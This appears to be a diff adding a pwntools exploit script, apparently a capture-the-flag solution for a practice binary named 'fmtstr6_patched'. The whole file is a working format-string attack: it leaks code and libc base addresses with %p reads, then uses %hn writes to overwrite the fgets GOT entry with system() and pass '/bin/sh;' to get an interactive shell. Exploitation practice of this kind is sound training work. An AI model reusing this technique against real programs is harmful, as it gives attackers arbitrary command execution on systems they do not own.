@@ -1,0 +1,50 @@
+from pwn import *
+
+# "/bin/sh;" co the chay ke ca khi dang sau khong co null byte
+
+p = process("./fmtstr6_patched")
+
+'''
+p = gdb.debug("./fmtstr6_patched", gdbscript = 
+breakrva 0x1260
+r
+)
+'''
+
+
+e = ELF("./fmtstr6_patched")
+libc = ELF("./libc-2.31.so")
+
+payload = b"%11$p"
+p.sendlineafter(b"string: ", payload)
+code_base = int(p.recvline(), 16) - 4813
+payload = b"%19$p"
+p.sendlineafter(b"string: ", payload)
+libc_base = int(p.recvline(), 16) - 159779
+
+fgets_got = code_base + e.got['fgets']
+system = libc_base + libc.symbols['system']
+
+def divine(var):
+    l = []
+    cnt = 0
+    for i in range(4):
+        l.append([var & 0xffff, cnt])
+        var = var >> 16
+        cnt += 2
+    l = sorted(l, key = lambda e: e[0])
+    return l
+
+l = divine(system)
+
+payload = b""
+payload = b"/bin/sh;"
+payload += f"%{l[1][0] - l[0][0] - 8}c%13$hn".encode() if(l[1][0] > l[0][0]) else f"%13$hn".encode()
+payload += f"%{l[2][0] - l[1][0]}c%14$hn".encode() if(l[2][0] > l[1][0]) else f"%14$hn".encode()
+payload += f"%{l[3][0] - l[2][0]}c%15$hn".encode() if(l[3][0] > l[2][0]) else f"%15$hn".encode()
+payload = payload.ljust(0x30, b'\x00') + p64(0) + p64(fgets_got + l[1][1]) + p64(fgets_got + l[2][1]) + p64(fgets_got + l[3][1])
+
+p.sendlineafter(b"string: ", payload)
+
+p.interactive()
+
